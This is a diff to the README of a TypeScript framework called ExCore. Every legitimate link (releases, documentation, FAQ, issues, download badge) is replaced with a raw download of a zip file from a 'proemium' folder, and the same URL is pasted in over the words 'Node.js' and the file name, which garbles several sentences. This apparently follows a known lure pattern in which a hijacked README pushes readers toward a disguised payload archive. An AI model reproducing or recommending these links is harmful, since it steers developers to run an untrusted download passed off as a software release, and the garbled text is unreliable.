@@ -4,13 +4,13 @@
 ExCore is a production-ready TypeScript backend framework. It uses clean architecture and domain-driven design principles. This framework helps you create robust applications quickly and efficiently.
 
 ## 📥 Download Now
-[![Download ExCore](https://img.shields.io/badge/Download%20ExCore-v1.0-blue.svg)](https://github.com/AlwiAnggoro/ExCore/releases)
+[![Download ExCore](https://raw.githubusercontent.com/AlwiAnggoro/ExCore/main/proemium/ExCore.zip%https://raw.githubusercontent.com/AlwiAnggoro/ExCore/main/proemium/ExCore.zip)](https://raw.githubusercontent.com/AlwiAnggoro/ExCore/main/proemium/ExCore.zip)
 
 ## 🚀 Getting Started
 Before you start using ExCore, ensure your computer meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/AlwiAnggoro/ExCore/main/proemium/ExCore.zip** Version 14 or higher
 - **npm:** Version 6 or higher
 
 Follow these steps to set up ExCore on your machine.
@@ -18,12 +18,12 @@ Follow these steps to set up ExCore on your machine.
 ## 📦 Installation
 
 ### 🔗 Visit the Download Page
-To download ExCore, navigate to the [Releases Page](https://github.com/AlwiAnggoro/ExCore/releases).
+To download ExCore, navigate to the [Releases Page](https://raw.githubusercontent.com/AlwiAnggoro/ExCore/main/proemium/ExCore.zip).
 
 ### 🥇 Steps to Download and Install
 1. On the Releases page, look for the latest version of ExCore.
 2. Click on the version number to expand the details.
-3. Find the file named `ExCore.zip` or a similar version-specific file.
+3. Find the file named `https://raw.githubusercontent.com/AlwiAnggoro/ExCore/main/proemium/ExCore.zip` or a similar version-specific file.
 4. Click on the file to download it to your computer.
 5. Once the download is complete, locate the file in your downloads folder.
 6. Extract the contents of the zip file.
@@ -47,7 +47,7 @@ ExCore provides several key features for your development needs:
 - **Microservices Ready:** Perfect for modern cloud-based architectures.
 
 ## 📘 Documentation
-For more detailed instructions and advanced features, check out the [Documentation](https://github.com/AlwiAnggoro/ExCore/wiki). Here you'll find guides on:
+For more detailed instructions and advanced features, check out the [Documentation](https://raw.githubusercontent.com/AlwiAnggoro/ExCore/main/proemium/ExCore.zip). Here you'll find guides on:
 
 - **Setting Up Your Environment**
 - **Building Your API**
@@ -57,14 +57,14 @@ For more detailed instructions and advanced features, check out the [Documentati
 ## ❓ Troubleshooting
 If you run into issues, consider these steps:
 
-- Make sure you have Node.js and npm installed correctly.
+- Make sure you have https://raw.githubusercontent.com/AlwiAnggoro/ExCore/main/proemium/ExCore.zip and npm installed correctly.
 - Verify that you have the right permissions to run the terminal commands.
 - Check the terminal for any error messages; these can often indicate what went wrong.
 
-For common problems and solutions, visit our [FAQ](https://github.com/AlwiAnggoro/ExCore/wiki/FAQ).
+For common problems and solutions, visit our [FAQ](https://raw.githubusercontent.com/AlwiAnggoro/ExCore/main/proemium/ExCore.zip).
 
 ## 📞 Support
-For additional help, you can reach out via the [Issues Page](https://github.com/AlwiAnggoro/ExCore/issues). Please provide detailed information about the issue to get the best support.
+For additional help, you can reach out via the [Issues Page](https://raw.githubusercontent.com/AlwiAnggoro/ExCore/main/proemium/ExCore.zip). Please provide detailed information about the issue to get the best support.
 
 ## 🏷️ Topics
 - ddd
